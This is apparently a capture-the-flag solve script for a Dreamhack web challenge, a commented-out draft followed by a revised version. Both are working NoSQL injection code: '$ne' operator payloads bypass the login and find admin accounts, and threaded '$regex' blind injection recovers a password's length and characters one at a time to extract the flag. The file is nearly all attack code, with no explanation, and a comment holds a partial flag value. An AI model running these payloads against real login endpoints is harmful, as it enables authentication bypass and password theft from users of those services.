# import requests
# import string
# from concurrent.futures import ThreadPoolExecutor

# URL = "http://host3.dreamhack.games:13917"
# PROXIES = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
# HEADERS = {"Content-Type": "application/json", "X-PwnFox-Color": "green"}
# CHARSET = string.ascii_letters + string.digits


# def get_admin_uid():
#     uids = [
#         "testuser",
#         "panda",
#         "melon",
#         "ice",
#         "hack",
#         "guest",
#         "cream",
#         "berry",
#         "apple",
#         "admin",
#         "aaaa",
#     ]
#     admin_uid = []

#     def check_uid(uid):
#         with requests.Session() as session:
#             payload = {"uid": uid, "upw": {"$ne": "anything"}}
#             session.post(
#                 URL + "/login", json=payload, proxies=PROXIES, headers=HEADERS
#             )
#             response_user = session.get(
#                 URL + "/user", proxies=PROXIES, headers=HEADERS
#             )
#             if "Your admin auth: 1" in response_user.text:
#                 return uid
#         return None

#     with ThreadPoolExecutor(max_workers=5) as executor:
#         results = executor.map(check_uid, uids)
#         for res in results:
#             if res:
#                 admin_uid.append(res)
#                 print(f"Admin found: {res}")
#     return admin_uid


# def check_match(uid, upw_prefix):
#     escaped_prefix = "".join(
#         [f"\\{c}" if c in "{}$^.*+?()[]|" else c for c in upw_prefix]
#     )
#     payload = {"uid": uid, "upw": {"$regex": f"^{escaped_prefix}"}}
#     response = requests.post(
#         URL + "/login",
#         json=payload,
#         proxies=PROXIES,
#         headers=HEADERS,
#         allow_redirects=False,
#     )
#     return (
#         response.status_code == 302
#         and response.headers.get("Location") == "/user"
#     )


# def brute_force_char(uid, current_upw, char):
#     if check_match(uid, current_upw + char):
#         return char
#     return None


# def brute_force_password(uid):
#     upw = "DH{"
#     while True:
#         with ThreadPoolExecutor(max_workers=10) as executor:
#             futures = [
#                 executor.submit(brute_force_char, uid, upw, char)
#                 for char in CHARSET
#             ]
#             char_found = False
#             for future in futures:
#                 result = future.result()
#                 if result:
#                     upw += result
#                     print(f"[{uid}] upw progress: {upw}")
#                     char_found = True
#                     break
#         if not char_found or upw.endswith("}"):
#             print(f"==> Final upw for {uid}: {upw}")
#             break


# admin_uid = ["cream", "testuser"]
# for uid in admin_uid:
#     if check_match(uid, "DH{"):
#         brute_force_password(uid)
import string
import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://host3.dreamhack.games:13917"
PROXIES = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
HEADERS = {"Content-Type": "application/json", "X-PwnFox-Color": "red"}
CHARSET = string.ascii_letters + string.digits

def get_admin_uid():
    uids = [
        "testuser",
        "panda",
        "melon",
        "ice",
        "hack",
        "guest",
        "cream",
        "berry",
        "apple",
        "admin",
        "aaaa",
    ]
    admin_uid = []

    def check_uid(uid):
        with requests.Session() as session:
            payload = {"uid": uid, "upw": {"$ne": "anything"}}
            session.post(
                URL + "/login", json=payload, proxies=PROXIES, headers=HEADERS
            )
            response_user = session.get(
                URL + "/user", proxies=PROXIES, headers=HEADERS
            )
            if "Your admin auth: 1" in response_user.text:
                return uid
        return None

    with ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(check_uid, uids)
        for res in results:
            if res:
                admin_uid.append(res)
                print(f"Admin found: {res}")
    return admin_uid

def check_match(payload):
    try:
        response = requests.post(
            URL + "/login",
            json=payload,
            proxies=PROXIES,
            headers=HEADERS,
            allow_redirects=False,
            timeout=5,
        )
        return (
            response.status_code == 302
            and response.headers.get("Location") == "/user"
        )
    except requests.RequestException:
        return False


def get_upw_length(uid, max_test_length=50):
    with ThreadPoolExecutor(max_workers=15) as executor:
        payloads = [
            (l, {"uid": uid, "upw": {"$regex": f"^.{{{l}}}$"}})
            for l in range(1, max_test_length + 1)
        ]
        futures = {
            executor.submit(check_match, p[1]): p[0] for p in payloads
        }
        for future in futures:
            if future.result():
                return futures[future]
    return None


def brute_force_password(uid, length):
    # upw = "DH{0da0d81e54f57be1b67f0e666e326954"
    upw = ""
    while len(upw) < length:
        remaining_len = length - len(upw)
        with ThreadPoolExecutor(max_workers=15) as executor:
            payloads = []
            for char in CHARSET:
                test_upw = upw + char
                escaped_prefix = "".join(
                    [
                        f"\\{c}" if c in "{}$^.*+?()[]|" else c
                        for c in test_upw
                    ]
                )
                payload = {
                    "uid": uid,
                    "upw": {"$regex": f"^{escaped_prefix}.{{{remaining_len-1}}}$"},
                }
                payloads.append((char, payload))

            futures = {
                executor.submit(check_match, p[1]): p[0] for p in payloads
            }
            char_found = False
            for future in futures:
                if future.result():
                    upw += futures[future]
                    print(f"[{uid}] upw progress: {upw}")
                    char_found = True
                    break

        if not char_found:
            break
    return upw


admin_uid = ["cream"]
for uid in admin_uid:
    length = 19
    if length:
        print(f"[+] Found {uid} upw length: {length}")
        final_upw = brute_force_password(uid, length)
        print(f"==> Final upw for {uid}: {final_upw}")
    else:
        print(f"[-] Could not find upw length for {uid}")

# need to get password of 2 admin user :)))))) 